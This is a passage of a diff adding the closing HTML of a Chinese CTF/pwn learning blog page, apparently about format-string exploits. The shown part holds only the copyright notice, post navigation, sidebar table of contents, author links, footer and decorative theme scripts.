+    <strong>本文链接：</strong>
+    <a href="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/" title="格式化字符串专题加强">http://linkpwn.github.io/2025/07/08/格式化字符串专题加强/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" rel="prev" title="sandbox专题学习">
+      <i class="fa fa-chevron-left"></i> sandbox专题学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/" rel="next" title="[网鼎杯 2020 青龙组]jocker">
+      [网鼎杯 2020 青龙组]jocker <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#TGCTF-fmt"><span class="nav-number">1.</span> <span class="nav-text">TGCTF fmt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">2.</span> <span class="nav-text">level3</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
